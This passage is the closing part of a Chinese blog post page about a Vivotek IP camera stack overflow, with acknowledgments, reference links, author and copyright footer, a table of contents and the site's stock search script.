+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/e748eaa99150d81de7fcd071efd037a61bc87479" alt=""></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/vivotek-remote-stack-overflow-exp-research/49e4aacd7fd50f3599b6e18b91d3f456433df213" alt=""></p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>第一次接触 <code>ARM</code> 汇编，有很多不足之处，欢迎各大佬指正。中途踩了不少坑，感谢 404 小伙伴 @Hcamael 和 @没有ID 的各种疑难解答。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.seebug.org/vuldb/ssvid-96866" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-96866</a><br><a href="http://seclists.org/fulldisclosure/2017/Nov/31" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2017/Nov/31</a><br><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">https://paper.seebug.org/271/</a><br><a href="https://paper.seebug.org/272/" target="_blank" rel="noopener">https://paper.seebug.org/272/</a><br><a href="http://0x48.pw/2016/11/03/0x26/" target="_blank" rel="noopener">http://0x48.pw/2016/11/03/0x26/</a><br><a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/107276.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+
+
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 fenix 的个人博客">fenix</a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="https://0x43434343.com/2017/12/14/201712142254/" title="Vivotek 摄像头远程栈溢出漏洞分析及利用">Vivotek 摄像头远程栈溢出漏洞分析及利用</a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="https://0x43434343.com/2017/12/14/201712142254/" title="Vivotek 摄像头远程栈溢出漏洞分析及利用">https://0x43434343.com/2017/12/14/201712142254/</a>
+        </li>
+
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2017年12月14日 - 22时12分
+        </li>  
+
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 fenix 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+
+      
+        <div class="post-tags">
+          
+            <a href="/tags/stackoverflow/" rel="tag"># stackoverflow</a>
+          
+            <a href="/tags/vivotek/" rel="tag"># vivotek</a>
+          
+            <a href="/tags/ipcam/" rel="tag"># ipcam</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/11/201712111121/" rel="next" title="Uniview NVR 设备全版本未授权远程命令执行漏洞分析">
+                <i class="fa fa-chevron-left"></i> Uniview NVR 设备全版本未授权远程命令执行漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/17/201712172013/" rel="prev" title="macOS 使用教程">
+                macOS 使用教程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="fenix" />
+            
+              <p class="site-author-name" itemprop="name">fenix</p>
+              <p class="site-description motion-element" itemprop="description">愿得一人心，白首不分离。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/13ph03nix" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:abcnsxyz@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#调试环境搭建"><span class="nav-number">2.</span> <span class="nav-text">调试环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#固件下载"><span class="nav-number">2.1.</span> <span class="nav-text">固件下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复运行依赖"><span class="nav-number">2.2.</span> <span class="nav-text">修复运行依赖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境"><span class="nav-number">2.3.</span> <span class="nav-text">调试环境</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞研究"><span class="nav-number">3.</span> <span class="nav-text">漏洞研究</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#定位溢出点"><span class="nav-number">3.1.</span> <span class="nav-text">定位溢出点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用栈布局"><span class="nav-number">3.2.</span> <span class="nav-text">调用栈布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-研究"><span class="nav-number">3.3.</span> <span class="nav-text">exp 研究</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#致谢"><span class="nav-number">4.</span> <span class="nav-text">致谢</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fenix</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">88.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://0x43434343.com/2017/12/14/201712142254/';
+          this.page.identifier = '2017/12/14/201712142254/';
+          this.page.title = 'Vivotek 摄像头远程栈溢出漏洞分析及利用';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://fenixns.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
